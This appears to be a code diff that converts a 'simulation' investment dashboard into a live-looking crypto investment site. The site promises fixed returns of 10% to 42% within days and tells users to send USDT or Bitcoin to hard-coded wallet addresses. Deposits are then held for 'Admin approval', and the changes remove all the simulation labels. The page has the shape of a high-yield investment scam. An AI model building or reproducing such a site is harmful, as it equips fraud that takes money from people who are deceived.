@@ -1,9 +1,9 @@
-<!DOCTYPE html>
+here<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>GROWTHMAX | Simulation Platform</title>
+  <title>GROWTHMAX | Investment & Growth Platform</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 </head>
@@ -14,7 +14,7 @@
     <div class="max-w-7xl mx-auto px-4 py-4 flex justify-between items-center">
       <div class="flex items-center space-x-2">
         <span class="text-2xl font-black tracking-wider text-emerald-400">GROWTHMAX</span>
-        <span class="bg-emerald-500/10 text-emerald-400 text-xs px-2 py-0.5 rounded font-mono border border-emerald-500/20">SIMULATION</span>
+        <span class="bg-emerald-500/10 text-emerald-400 text-xs px-2 py-0.5 rounded font-mono border border-emerald-500/20">PORTFOLIO</span>
       </div>
       <div id="nav-buttons" class="flex items-center space-x-3">
         <a href="#auth" class="text-sm font-semibold text-slate-300 hover:text-white px-3 py-2">Sign In</a>
@@ -24,32 +24,38 @@
   </header>
 
   <!-- Hero Section -->
-  <section class="py-12 px-4 text-center max-w-4xl mx-auto">
+  <section class="py-10 px-4 text-center max-w-4xl mx-auto">
     <h1 class="text-4xl sm:text-6xl font-extrabold tracking-tight mb-4">
-      Smart Investment Growth <br/><span class="text-emerald-400">Simulated in Real-Time</span>
+      Smart Wealth Growth <br/><span class="text-emerald-400">Automated Performance</span>
     </h1>
     <p class="text-slate-400 text-base sm:text-lg mb-6 max-w-2xl mx-auto">
-      Experience automated wealth management, live financial markets, and transparent performance tracking on Growthmax.
+      Select an investment plan, track live financial markets, and view your account portfolio growth in real-time.
     </p>
   </section>
 
-  <!-- Dashboard Section (Hidden by Default) -->
+  <!-- Dashboard Section (Logged In) -->
   <section id="dashboard" class="hidden max-w-4xl mx-auto px-4 py-6 w-full">
     <div class="bg-slate-800/80 border border-slate-700 rounded-2xl p-6 shadow-xl mb-8">
       <div class="flex justify-between items-center mb-6">
         <div>
-          <h2 class="text-xl font-bold text-slate-200">Simulated Portfolio</h2>
+          <h2 class="text-xl font-bold text-slate-200">Account Balance</h2>
           <p id="user-email" class="text-xs text-slate-400"></p>
         </div>
         <button onclick="handleLogout()" class="text-xs bg-red-500/10 border border-red-500/30 text-red-400 px-3 py-1.5 rounded-lg hover:bg-red-500/20">Log Out</button>
       </div>
-      <div class="bg-slate-900/80 p-6 rounded-xl border border-slate-800 mb-6">
-        <span class="text-xs text-slate-400 uppercase tracking-wider font-semibold">Total Balance</span>
-        <div class="text-4xl font-extrabold text-emerald-400 mt-1" id="user-balance">$0.00</div>
+
+      <div class="bg-slate-900/80 p-6 rounded-xl border border-slate-800 mb-6 flex justify-between items-center">
+        <div>
+          <span class="text-xs text-slate-400 uppercase tracking-wider font-semibold">Total Funds</span>
+          <div class="text-4xl font-extrabold text-emerald-400 mt-1" id="user-balance">$0.00</div>
+        </div>
+        <button onclick="openDepositModal()" class="bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold px-5 py-3 rounded-xl transition text-sm">+ Add Funds</button>
       </div>
-      <div class="grid grid-cols-2 gap-4">
-        <button onclick="simulatedDeposit()" class="bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold py-3 rounded-xl transition text-sm">+ Add $500 Test Funds</button>
-        <button onclick="simulatedReset()" class="border border-slate-700 hover:bg-slate-700 text-slate-300 font-bold py-3 rounded-xl transition text-sm">Reset Balance</button>
+
+      <!-- Deposit History -->
+      <h3 class="text-sm font-bold text-slate-300 mb-3">Deposit Requests</h3>
+      <div id="deposit-history" class="space-y-2 text-xs">
+        <p class="text-slate-500">No recent deposits found.</p>
       </div>
     </div>
   </section>
@@ -76,6 +82,76 @@
       </form>
     </div>
   </section>
+
+  <!-- Deposit Modal -->
+  <div id="deposit-modal" class="hidden fixed inset-0 bg-slate-950/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
+    <div class="bg-slate-900 border border-slate-700 rounded-2xl p-6 max-w-lg w-full max-h-[90vh] overflow-y-auto shadow-2xl">
+      <div class="flex justify-between items-center mb-4">
+        <h3 class="text-lg font-bold text-emerald-400">Choose Investment Plan</h3>
+        <button onclick="closeDepositModal()" class="text-slate-400 hover:text-white text-lg font-bold">&times;</button>
+      </div>
+
+      <!-- Step 1: Select Plan -->
+      <div id="deposit-step-1" class="space-y-3">
+        <div onclick="selectPlan('Beginners', 50, 499, '10%', '24H / 14 Days')" class="p-4 border border-slate-800 bg-slate-800/50 hover:border-emerald-500/50 rounded-xl cursor-pointer transition">
+          <div class="flex justify-between items-center"><span class="font-bold text-slate-200">Beginners</span><span class="text-xs bg-emerald-500/10 text-emerald-400 px-2 py-0.5 rounded">10% Profit</span></div>
+          <p class="text-xs text-slate-400 mt-1">Range: $50 - $499 | Duration: 24H, 14 Days</p>
+        </div>
+
+        <div onclick="selectPlan('Advanced', 500, 1999, '25%', '48H / 21 Days')" class="p-4 border border-slate-800 bg-slate-800/50 hover:border-emerald-500/50 rounded-xl cursor-pointer transition">
+          <div class="flex justify-between items-center"><span class="font-bold text-slate-200">Advanced</span><span class="text-xs bg-emerald-500/10 text-emerald-400 px-2 py-0.5 rounded">25% Profit</span></div>
+          <p class="text-xs text-slate-400 mt-1">Range: $500 - $1,999 | Duration: 48H, 21 Days</p>
+        </div>
+
+        <div onclick="selectPlan('Pro/Expert', 2000, 4999, '35%', '72H / 30 Days')" class="p-4 border border-slate-800 bg-slate-800/50 hover:border-emerald-500/50 rounded-xl cursor-pointer transition">
+          <div class="flex justify-between items-center"><span class="font-bold text-slate-200">Pro/Expert</span><span class="text-xs bg-emerald-500/10 text-emerald-400 px-2 py-0.5 rounded">35% Profit</span></div>
+          <p class="text-xs text-slate-400 mt-1">Range: $2,000 - $4,999 | Duration: 72H, 30 Days</p>
+        </div>
+
+        <div onclick="selectPlan('Top Investor', 5000, 1000000, '42%', '98H / 62 Days')" class="p-4 border border-slate-800 bg-slate-800/50 hover:border-emerald-500/50 rounded-xl cursor-pointer transition">
+          <div class="flex justify-between items-center"><span class="font-bold text-slate-200">Top Investor</span><span class="text-xs bg-emerald-500/10 text-emerald-400 px-2 py-0.5 rounded">42% Profit</span></div>
+          <p class="text-xs text-slate-400 mt-1">Range: $5,000 - Unlimited | Duration: 98H, 62 Days</p>
+        </div>
+      </div>
+
+      <!-- Step 2: Enter Amount & Wallet Payment -->
+      <div id="deposit-step-2" class="hidden space-y-4">
+        <p id="selected-plan-title" class="text-xs text-emerald-400 font-bold uppercase tracking-wider"></p>
+        
+        <div>
+          <label class="block text-xs text-slate-400 mb-1">Enter Amount ($)</label>
+          <input type="number" id="deposit-amount" class="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 py-2 text-sm text-slate-100 focus:outline-none focus:border-emerald-400">
+        </div>
+
+        <div>
+          <label class="block text-xs text-slate-400 mb-1">Select Payment Asset</label>
+          <select id="payment-method" onchange="updateWalletDisplay()" class="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 py-2 text-sm text-slate-100 focus:outline-none focus:border-emerald-400">
+            <option value="USDT TRC20">USDT (TRC20)</option>
+            <option value="Bitcoin">Bitcoin (BTC)</option>
+          </select>
+        </div>
+
+        <div class="p-3 bg-slate-950 border border-slate-800 rounded-xl text-xs space-y-2">
+          <p class="text-slate-400">Send deposit to wallet address:</p>
+          <div class="bg-slate-900 p-2 rounded border border-slate-700 font-mono text-[11px] break-all text-emerald-300" id="wallet-address-display">
+            TNKNFATEk2vMZA7FAFs5cHPim9ZQxf4G8W
+          </div>
+        </div>
+
+        <div>
+          <label class="block text-xs text-slate-400 mb-1">Transaction Hash / ID (Optional)</label>
+          <input type="text" id="txn-hash" placeholder="e.g., 0x123... or TxID" class="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 py-2 text-sm text-slate-100 focus:outline-none focus:border-emerald-400">
+        </div>
+
+        <div id="deposit-msg" class="text-xs text-center min-h-[16px]"></div>
+
+        <div class="flex gap-2">
+          <button onclick="backToStep1()" class="w-1/3 border border-slate-700 text-slate-400 py-2.5 rounded-lg text-sm">Back</button>
+          <button onclick="submitDeposit()" class="w-2/3 bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold py-2.5 rounded-lg transition text-sm">Submit Deposit</button>
+        </div>
+      </div>
+    </div>
+  </div>
 
   <!-- Live Market Ticker -->
   <section id="market" class="max-w-7xl mx-auto px-4 py-8 w-full">
@@ -115,25 +191,20 @@
     const SUPABASE_KEY = 'Sb_publishable_rNhkw6HQBomeKq-iIr3gDA_XxOavsaS';
     const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
+    const WALLETS = {
+      'USDT TRC20': 'TNKNFATEk2vMZA7FAFs5cHPim9ZQxf4G8W',
+      'Bitcoin': '1AjyX3mQ54cSdcEWjAbE7mdZbAHG5tDmfY'
+    };
+
     let authMode = 'login';
+    let activePlan = null;
 
     function switchAuthMode(mode) {
       authMode = mode;
-      const loginTab = document.getElementById('tab-login');
-      const signupTab = document.getElementById('tab-signup');
-      const submitBtn = document.getElementById('auth-btn');
-      const msg = document.getElementById('auth-message');
-      msg.textContent = '';
-
-      if (mode === 'login') {
-        loginTab.className = "flex-1 py-2 text-center text-sm font-bold border-b-2 border-emerald-400 text-emerald-400";
-        signupTab.className = "flex-1 py-2 text-center text-sm font-bold text-slate-400 border-b-2 border-transparent";
-        submitBtn.textContent = 'Sign In';
-      } else {
-        signupTab.className = "flex-1 py-2 text-center text-sm font-bold border-b-2 border-emerald-400 text-emerald-400";
-        loginTab.className = "flex-1 py-2 text-center text-sm font-bold text-slate-400 border-b-2 border-transparent";
-        submitBtn.textContent = 'Create Account';
-      }
+      document.getElementById('tab-login').className = mode === 'login' ? "flex-1 py-2 text-center text-sm font-bold border-b-2 border-emerald-400 text-emerald-400" : "flex-1 py-2 text-center text-sm font-bold text-slate-400 border-b-2 border-transparent";
+      document.getElementById('tab-signup').className = mode === 'signup' ? "flex-1 py-2 text-center text-sm font-bold border-b-2 border-emerald-400 text-emerald-400" : "flex-1 py-2 text-center text-sm font-bold text-slate-400 border-b-2 border-transparent";
+      document.getElementById('auth-btn').textContent = mode === 'login' ? 'Sign In' : 'Create Account';
+      document.getElementById('auth-message').textContent = '';
     }
 
     async function handleAuth(e) {
@@ -141,7 +212,6 @@
       const email = document.getElementById('auth-email').value;
       const password = document.getElementById('auth-password').value;
       const msg = document.getElementById('auth-message');
-
       msg.className = "text-xs text-center text-slate-400";
       msg.textContent = "Processing...";
 
@@ -152,7 +222,7 @@
           msg.textContent = error.message;
         } else {
           msg.className = "text-xs text-center text-emerald-400";
-          msg.textContent = "Account created! Logging in...";
+          msg.textContent = "Account registered!";
           await loadUserData(data.user);
         }
       } else {
@@ -175,38 +245,104 @@
       document.getElementById('nav-buttons').classList.add('hidden');
       document.getElementById('user-email').textContent = user.email;
 
-      const { data, error } = await supabaseClient.from('profiles').select('balance').eq('id', user.id).single();
-      if (data) {
-        document.getElementById('user-balance').textContent = '$' + parseFloat(data.balance).toFixed(2);
+      const { data } = await supabaseClient.from('profiles').select('balance').eq('id', user.id).single();
+      if (data) document.getElementById('user-balance').textContent = '$' + parseFloat(data.balance).toFixed(2);
+
+      loadDepositHistory(user.id);
+    }
+
+    async function loadDepositHistory(userId) {
+      const { data } = await supabaseClient.from('deposits').select('*').eq('user_id', userId).order('created_at', { ascending: false });
+      const container = document.getElementById('deposit-history');
+      if (data && data.length > 0) {
+        container.innerHTML = data.map(d => `
+          <div class="p-3 bg-slate-900 border border-slate-800 rounded-lg flex justify-between items-center">
+            <div>
+              <span class="font-bold text-slate-200">$${parseFloat(d.amount).toFixed(2)} (${d.plan_name})</span>
+              <p class="text-[10px] text-slate-500">${d.payment_method} • ${new Date(d.created_at).toLocaleDateString()}</p>
+            </div>
+            <span class="px-2 py-0.5 rounded text-[10px] uppercase font-bold ${d.status === 'approved' ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' : d.status === 'rejected' ? 'bg-red-500/10 text-red-400 border border-red-500/20' : 'bg-yellow-500/10 text-yellow-400 border border-yellow-500/20'}">${d.status}</span>
+          </div>
+        `).join('');
+      } else {
+        container.innerHTML = `<p class="text-slate-500">No recent deposits found.</p>`;
       }
     }
 
-    async function simulatedDeposit() {
+    function openDepositModal() {
+      document.getElementById('deposit-modal').classList.remove('hidden');
+      backToStep1();
+    }
+
+    function closeDepositModal() {
+      document.getElementById('deposit-modal').classList.add('hidden');
+    }
+
+    function selectPlan(name, min, max, profit, duration) {
+      activePlan = { name, min, max, profit, duration };
+      document.getElementById('selected-plan-title').textContent = `${name} Plan (${profit} profit / ${duration})`;
+      document.getElementById('deposit-amount').value = min;
+      document.getElementById('deposit-step-1').classList.add('hidden');
+      document.getElementById('deposit-step-2').classList.remove('hidden');
+      updateWalletDisplay();
+    }
+
+    function backToStep1() {
+      document.getElementById('deposit-step-1').classList.remove('hidden');
+      document.getElementById('deposit-step-2').classList.add('hidden');
+    }
+
+    function updateWalletDisplay() {
+      const method = document.getElementById('payment-method').value;
+      document.getElementById('wallet-address-display').textContent = WALLETS[method];
+    }
+
+    async function submitDeposit() {
+      const amount = parseFloat(document.getElementById('deposit-amount').value);
+      const method = document.getElementById('payment-method').value;
+      const hash = document.getElementById('txn-hash').value;
+      const msg = document.getElementById('deposit-msg');
+
+      if (!amount || amount < activePlan.min) {
+        msg.className = "text-xs text-center text-red-400";
+        msg.textContent = `Minimum deposit for ${activePlan.name} is $${activePlan.min}`;
+        return;
+      }
+
       const { data: { user } } = await supabaseClient.auth.getUser();
       if (!user) return;
 
-      const { data } = await supabaseClient.from('profiles').select('balance').eq('id', user.id).single();
-      const current = data ? parseFloat(data.balance) : 0;
-      const newBal = current + 500;
+      msg.className = "text-xs text-center text-slate-400";
+      msg.textContent = "Submitting request...";
 
-      await supabaseClient.from('profiles').update({ balance: newBal }).eq('id', user.id);
-      document.getElementById('user-balance').textContent = '$' + newBal.toFixed(2);
+      const { error } = await supabaseClient.from('deposits').insert([{
+        user_id: user.id,
+        user_email: user.email,
+        plan_name: activePlan.name,
+        amount: amount,
+        payment_method: method,
+        txn_hash: hash,
+        status: 'pending'
+      }]);
+
+      if (error) {
+        msg.className = "text-xs text-center text-red-400";
+        msg.textContent = error.message;
+      } else {
+        msg.className = "text-xs text-center text-emerald-400";
+        msg.textContent = "Deposit submitted! Awaiting Admin approval.";
+        setTimeout(() => {
+          closeDepositModal();
+          loadDepositHistory(user.id);
+        }, 1500);
+      }
     }
 
-    async function simulatedReset() {
-      const { data: { user } } = await supabaseClient.auth.getUser();
-      if (!user) return;
-
-      await supabaseClient.from('profiles').update({ balance: 0 }).eq('id', user.id);
-      document.getElementById('user-balance').textContent = '$0.00';
-    }
-
-    async function handleLogout() {
-      await supabaseClient.auth.signOut();
+    function handleLogout() {
+      supabaseClient.auth.signOut();
       window.location.reload();
     }
 
-    // Auto load session on refresh
     window.addEventListener('DOMContentLoaded', async () => {
       const { data: { user } } = await supabaseClient.auth.getUser();
       if (user) loadUserData(user);
@@ -214,4 +350,3 @@
   </script>
 </body>
 </html>
-￼Enter
